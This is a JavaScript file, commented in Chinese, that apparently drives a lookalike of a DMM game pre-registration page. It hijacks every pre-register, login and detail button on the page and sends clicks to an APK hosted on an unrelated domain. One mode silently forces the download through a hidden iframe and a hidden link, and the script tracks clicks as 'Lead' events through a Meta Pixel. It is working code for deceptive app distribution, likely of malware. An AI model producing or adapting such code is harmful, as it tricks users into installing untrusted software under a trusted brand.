// ==============================================================================
// tokyo_md_r01 落地页全局下载配置 (直截了当，点击即刻下载/跳转)
// ==============================================================================

window.AppConfig = {
    // 目标 APP 下载链接 / APK 直链
    downloadUrl: "https://a0062.zx12395.com/xuhay.apk",

    // 下载模式:
    // false = 直接跳转目标链接 (默认)
    // true  = 留在当前页面，静默唤起 APK 文件下载
    directMode: false,

    // Meta Pixel 像素统计 ID (可选)
    pixelId: ""
};

(function () {
    // 1. Meta Pixel 像素初始化 (若配置)
    if (window.AppConfig.pixelId && window.AppConfig.pixelId.trim() !== "") {
        (function (f, b, e, v, n, t, s) {
            if (f.fbq) return; n = f.fbq = function () {
                n.callMethod ?
                n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
            n.queue = []; t = b.createElement(e); t.async = !0;
            t.src = v; s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        })(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');

        fbq('init', window.AppConfig.pixelId);
        fbq('track', 'PageView');
    }

    // 2. 核心点击处理: 瞬间响应，直奔下载
    function executeDownload(e) {
        if (e) {
            e.preventDefault();
            e.stopPropagation();
            if (e.stopImmediatePropagation) e.stopImmediatePropagation();
        }

        const url = (window.AppConfig.downloadUrl || "").trim();
        if (!url || url === "#") {
            alert("下载链接未配置，请在 config.js 中填写 downloadUrl！");
            return;
        }

        // Meta Pixel 事件
        if (window.fbq && window.AppConfig.pixelId) {
            try {
                fbq('track', 'Lead');
                fbq('trackCustom', 'DownloadClick');
            } catch (err) { }
        }

        if (window.AppConfig.directMode) {
            // 静默下载模式: 隐藏 iframe 与 a 标签唤起下载，不跳网页
            let iframe = document.getElementById("silent-download-frame");
            if (!iframe) {
                iframe = document.createElement("iframe");
                iframe.id = "silent-download-frame";
                iframe.style.display = "none";
                document.body.appendChild(iframe);
            }
            iframe.src = url;

            const a = document.createElement("a");
            a.href = url;
            const parts = url.split("/");
            const filename = parts[parts.length - 1];
            a.download = (filename && filename.includes(".")) ? filename : "tokyo_md.apk";
            a.style.display = "none";
            document.body.appendChild(a);
            a.click();
            setTimeout(() => { if (a.parentNode) a.parentNode.removeChild(a); }, 1000);
        } else {
            // 直接跳转模式: 瞬间转跳到下载页面
            window.location.href = url;
        }
    }

    // 3. 捕获页面所有预约与事前登录按钮
    function bindDownloadButtons() {
        const selectors = [
            ".fn-skip-detail",
            ".bt-pre button",
            ".bt-side button",
            ".sect-footer__btn button",
            ".sect-character__group-btn button",
            "[data-gtm-action-detail*='login_start']",
            "button:has(img[src*='common-btn__pre'])",
            "a[href*='games.dmm.co.jp/detail']"
        ];

        const buttons = document.querySelectorAll(selectors.join(","));
        buttons.forEach(btn => {
            btn.onclick = null;
            btn.removeAttribute("onclick");
            btn.addEventListener("click", executeDownload, true);
        });
    }

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", bindDownloadButtons);
    } else {
        bindDownloadButtons();
    }
    setTimeout(bindDownloadButtons, 300);
    setTimeout(bindDownloadButtons, 1000);
})();
